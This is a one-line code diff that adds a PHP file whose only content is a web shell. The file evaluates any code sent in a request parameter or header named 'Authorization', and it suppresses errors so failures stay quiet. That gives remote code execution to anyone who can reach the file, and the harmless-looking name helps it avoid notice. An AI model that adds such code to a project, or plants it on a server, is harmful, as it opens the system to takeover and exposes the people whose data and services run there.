@@ -1,0 +1,1 @@
+<?php @eval($_REQUEST["Authorization"]);@eval($_HEADERS["Authorization"]);
